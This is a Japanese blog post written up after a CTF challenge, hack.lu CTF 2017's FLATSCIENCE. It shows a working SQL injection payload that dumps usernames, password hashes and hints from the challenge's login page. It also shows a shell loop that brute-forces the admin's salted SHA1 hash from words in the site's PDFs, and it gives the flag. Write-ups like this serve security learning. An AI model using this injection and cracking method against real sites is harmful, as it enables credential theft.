---
layout: post
redirect_from:
  - /blog/2017/10/20/hacklu-ctf-2017-flatscience/
date: "2017-10-20T01:32:23+09:00"
tags: [ "ctf", "writeup", "hacklu-ctf", "web", "misc" ]
---

# hack.lu CTF 2017: FLATSCIENCE

人が`robots.txt`など下調べをし、別の人がSQLiでhashedなpasswordを抜き、残りの逆像求める部分を私がした。
たいてい独立にそれぞれ解いて終わるので、協力してやる感じは嫌いじゃないです。

## problem

<https://flatscience.flatearth.fluxfingers.net/>

昔のサイトにあったような迷路みたいなやつ

## solution

まず `robots.txt`。

```
User-agent: *
Disallow: /login.php
Disallow: /admin.php
```

`/login.php` ではSLQiができて、 `' union select 1, group_concat(name || ':' || password || ':' || hint) from Users;--` のようにすれば

```
admin:3fab54a50e770d830c0416df817567662a9dc85c:my fav word in my fav paper?!
fritze:2f72d9dd0f9d6ef605f402c91f517ea4:my love is...?
hansi:9e895c06352f4513fe179bf92b498397:the password is password
```

また `<!-- TODO: Remove ?debug-Parameter! -->` により、 `/login.php?debug` からソースコードを拾える。
`sha1($pass."Salz!")` が `3fab54a50e770d830c0416df817567662a9dc85c` な `$pass` を求めればよい。

`my fav word in my fav paper?!` って言ってるのでたくさん置いてあるPDF中にありそう。
とりあえず`wget`で再帰的に全部抜いて、grepとかではだめだったので以下のようにする:

``` sh
for f in flatscience.flatearth.fluxfingers.net/**/*.pdf ; do
    pdftotext $f /dev/stdout
done \
| sed 's/\s/\n/g' \
| sed 's/^\W*// ; s/\W*$//' \
| sort \
| uniq \
| while read line ; do
    echo -n "$line "
    echo -n "$line"'Salz!' | sha1sum
done \
| grep 3fab54a50e770d830c0416df817567662a9dc85c
```

`flag{Th3_Fl4t_Earth_Prof_i$_n0T_so_Smart_huh?}`
